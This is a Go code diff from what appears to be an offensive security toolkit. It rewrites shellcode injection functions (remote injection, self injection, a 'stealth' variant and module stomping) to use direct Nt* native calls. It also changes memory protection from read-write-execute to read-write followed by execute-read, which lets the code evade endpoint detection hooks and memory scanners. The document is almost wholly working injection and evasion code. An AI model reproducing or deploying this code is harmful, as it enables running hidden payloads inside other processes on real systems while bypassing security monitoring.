@@ -89,52 +89,58 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 }
 
 func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, error) {
-	intpid, err := strconv.Atoi(pid)
-	if err != nil {
-		return 0, err
-	}
 	var rights uint32 = windows.PROCESS_CREATE_THREAD |
 		windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION |
 		windows.PROCESS_VM_WRITE |
 		windows.PROCESS_VM_READ
-	var inheritHandle uint32 = 0
-	procHandle, err := winapi.OpenProcess(rights, inheritHandle, uint32(intpid))
+	intpid, err := strconv.Atoi(pid)
+	if err != nil {
+		return 0, err
+	}
+	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
 	if procHandle == 0 {
 		return 0, err
 	}
-	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
-	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
-	//var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
-	shellcodeLen := len(shellcode)
-	lpBaseAddress, err := winapi.VirtualAllocEx(procHandle, 0, uint32(shellcodeLen), flAllocationType, flProtect)
-	if lpBaseAddress == 0 {
+	var flProtect uint32 = windows.PAGE_READWRITE
+	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
+	var shellcodelen uintptr = uintptr(len(shellcode))
+	var lpBaseAddress uintptr = 0
+	var lens uint64 = uint64(len(shellcode))
+	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil || lpBaseAddress == 0 {
 		return 0, err
 	}
-	var nBytesWritten uint32
-	writeMem, err := winapi.WriteProcessMemory(
-		procHandle,
-		lpBaseAddress,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
-		uint32(shellcodeLen),
-		&nBytesWritten)
-	if !writeMem {
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
 		return 0, err
 	}
-	var threadId uint32 = 0
-	var dwCreationFlags uint32 = 0
-	thread, err := winapi.CreateRemoteThread(
-		procHandle,
-		uintptr(winapi.NullRef),
-		0,
-		lpBaseAddress,
-		uintptr(winapi.NullRef),
-		dwCreationFlags,
-		&threadId)
-	if thread == 0 {
+	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
 		return 0, err
 	}
-	return thread, nil
+	var remoteThread uintptr
+	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
+		&remoteThread,          //hthread
+		0x1FFFFF,               //desiredaccess
+		0,                      //objattributes
+		uintptr(procHandle),    //processhandle
+		uintptr(lpBaseAddress), //lpstartaddress
+		0,                      //lpparam
+		uintptr(0),             //createsuspended
+		0,                      //zerobits
+		0,                      //sizeofstackcommit
+		0,                      //sizeofstackreserve
+		0,                      //lpbytesbuffer
+	)
+	if err4 != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
+		return 0, err
+	}
+	return syscall.Handle(remoteThread), nil
 }
 
 func RemoteInject(shellcode []byte, pid string) (string, error) {
@@ -147,67 +153,63 @@ func RemoteInject(shellcode []byte, pid string) (string, error) {
 		windows.PROCESS_VM_OPERATION |
 		windows.PROCESS_VM_WRITE |
 		windows.PROCESS_VM_READ
-	var inheritHandle uint32 = 0
-	procHandle, err := winapi.OpenProcess(rights, inheritHandle, uint32(intpid))
+	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
 	if procHandle == 0 {
 		return "", err
 	}
-	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
-	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
-	var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
-	shellcodeLen := len(shellcode)
-	lpBaseAddress, err := winapi.VirtualAllocEx(
-		procHandle,
-		uintptr(winapi.NullRef),
-		uint32(shellcodeLen),
-		flAllocationType,
-		flProtect)
-	if lpBaseAddress == 0 {
+	var flProtect uint32 = windows.PAGE_READWRITE
+	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
+	var shellcodelen uintptr = uintptr(len(shellcode))
+	var lpBaseAddress uintptr = 0
+	var lens uint64 = uint64(len(shellcode))
+	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
 		return "", err
 	}
 	var nBytesWritten *uint32
-	writeMem, err := winapi.WriteProcessMemory(
-		procHandle,
-		lpBaseAddress,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
-		uint32(shellcodeLen),
-		nBytesWritten)
-	if !writeMem {
+	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
 		return "", err
 	}
-	var threadId uint32 = 0
-	var dwCreationFlags uint32 = 0
-	thread, err := winapi.CreateRemoteThread(
-		procHandle,
-		uintptr(winapi.NullRef),
-		0,
-		lpBaseAddress,
-		uintptr(winapi.NullRef),
-		dwCreationFlags,
-		&threadId)
-	if thread == 0 {
+	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
 		return "", err
+	}
+	var remoteThread uintptr
+	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
+		&remoteThread,          //hthread
+		0x1FFFFF,               //desiredaccess
+		0,                      //objattributes
+		uintptr(procHandle),    //processhandle
+		uintptr(lpBaseAddress), //lpstartaddress
+		0,                      //lpparam
+		uintptr(0),             //createsuspended
+		0,                      //zerobits
+		0,                      //sizeofstackcommit
+		0,                      //sizeofstackreserve
+		0,                      //lpbytesbuffer
+	)
+	if err4 != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
+		return "", err
+	}
+	if remoteThread == 0 {
+		windows.CloseHandle(windows.Handle(procHandle))
+		return "", err4
 	}
 	go func() {
-		windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
-		winapi.VirtualProtectEx(
-			procHandle,
-			lpBaseAddress,
-			uint32(shellcodeLen),
-			newFlProtect,
-			&flProtect)
-		windows.CloseHandle(windows.Handle(thread))
-		winapi.VirtualFreeEx(windows.Handle(procHandle), lpBaseAddress, 0, windows.MEM_RELEASE)
+		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
+		var freed uint64
+		rawapi.NtFreeVirtualMemory(procHandle, lpBaseAddress, freed, windows.MEM_RELEASE)
+		windows.CloseHandle(windows.Handle(remoteThread))
 		windows.CloseHandle(windows.Handle(procHandle))
 	}()
 	return "[+] Success", nil
 }
 
 func SelfInject(shellcode []byte) (string, error) {
-	procHandle := winapi.GetCurrentProcess()
-	if procHandle == 0 {
-		return "", errors.New("Failed to get handle to current process.")
-	}
 	shellcodeLen := len(shellcode)
 	heap, err := winapi.HeapCreate(winapi.HEAP_CREATE_ENABLE_EXECUTE, uint32(shellcodeLen), 0)
 	if heap == 0 {
@@ -241,29 +243,25 @@ func SelfInject(shellcode []byte) (string, error) {
 }
 
 func RawSelfInject(shellcode []byte) (string, error) {
-	//var baseA uintptr
-	//var zerob uint32 = 0
-	//regionsize := uint32(len(shellcode))
-	/*
-		err1 := rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, &baseA, zerob, &regionsize, uint32(rawapi.MemCommit|rawapi.Memreserve), syscall.PAGE_EXECUTE_READWRITE)
-		if err1 != nil {
-			return "", err1
-		}
-	*/
 	shellcodeLen := len(shellcode)
-	heap, err := winapi.HeapCreate(winapi.HEAP_CREATE_ENABLE_EXECUTE, uint32(shellcodeLen), 0)
-	if heap == 0 {
-		return "", err
-	}
-
-	baseA, err := winapi.HeapAlloc(syscall.Handle(heap), winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
-	if baseA == 0 {
+	var freed uint64
+	var baseA uintptr
+	baseA, err := rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, baseA, 0, uint64(shellcodeLen), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
 		return "", err
 	}
 	var written uint32
 	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
 	if err2 != nil {
+		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
 		return "", err2
+	}
+	var lens uintptr = uintptr(shellcodeLen)
+	var oldprot uint32
+	err = rawapi.NtProtectVirtualMemory(rawapi.ThisThread, baseA, &lens, windows.PAGE_EXECUTE_READ, &oldprot)
+	if err != nil {
+		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
+		return "", err
 	}
 	var hhosthread uintptr
 	err3 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
@@ -281,12 +279,13 @@ func RawSelfInject(shellcode []byte) (string, error) {
 	)
 	// cleanup
 	if err3 != nil {
-		winapi.HeapDestroy(heap)
+		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
 		return "", err3
 	}
-	// cant be run in go routine for some reason when using raw version.
-	windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
-	winapi.HeapDestroy(heap)
+	go func() {
+		windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
+		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
+	}()
 	return "[+] Success", nil
 }
 
@@ -310,7 +309,7 @@ func RemoteInjectStealth(shellcode []byte, pid string, addresstoinject string) (
 	if err != nil {
 		return "", err
 	}
-	hProcess, err := winapi.OpenProcess(windows.MAXIMUM_ALLOWED, 0, uint32(intpid))
+	hProcess, err := rawapi.NtOpenProcess(uint32(intpid), windows.MAXIMUM_ALLOWED)
 	if hProcess == 0 {
 		return "", err
 	}
@@ -370,40 +369,39 @@ func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
 		return "", errors.New("Payload too big for .text size")
 	}
 	var nBytesRead uint32
-	var base uintptr
+	var freed uint64
 	var payloadLength uint32 = uint32(len(shellcode))
 	hProcess, err := windows.GetCurrentProcess()
 	if err != nil {
 		return "", err
 	}
-	//err = rawapi.NtAllocateVirtualMemory(uintptr(hP), &base, 0, &payloadLength, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	base, err = winapi.VirtualAlloc(0, payloadLength, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	//base, err = windows.VirtualAlloc(0, uintptr(payloadLength), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	var base uintptr
+	base, err = rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, base, 0, uint64(payloadLength), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
 		return "", err
 	}
 	textStart := uintptr(unsafe.Pointer(moduleHandle + uintptr(textSection.VirtualAddress)))
 	err = rawapi.NtReadVirtualMemory(uintptr(hProcess), textStart, base, payloadLength, &nBytesRead)
 	if err != nil {
-		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		return "", err
 	}
 	var oldProtect uint32
 	var szPtr uintptr = uintptr(textSz)
 	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
 	if err != nil {
-		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		return "", err
 	}
 	var nBytesWritten *uint32
 	err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), nBytesWritten)
 	if err != nil {
-		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		return "", err
 	}
 	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
 	if err != nil {
-		//err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		return "", err
 	}
 	var remoteThread uintptr
@@ -424,7 +422,7 @@ func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
 	if err4 != nil {
 		rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
 		rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
-		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		return "", err4
 	}
 	go func() {
@@ -432,7 +430,7 @@ func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
 		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
 		err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
 		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
-		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		_, err = rawapi.NtFreeVirtualMemory(uintptr(hProcess), base, freed, windows.MEM_RELEASE)
 		windows.CloseHandle(windows.Handle(remoteThread))
 	}()
 	return "[+] Stomped.", nil
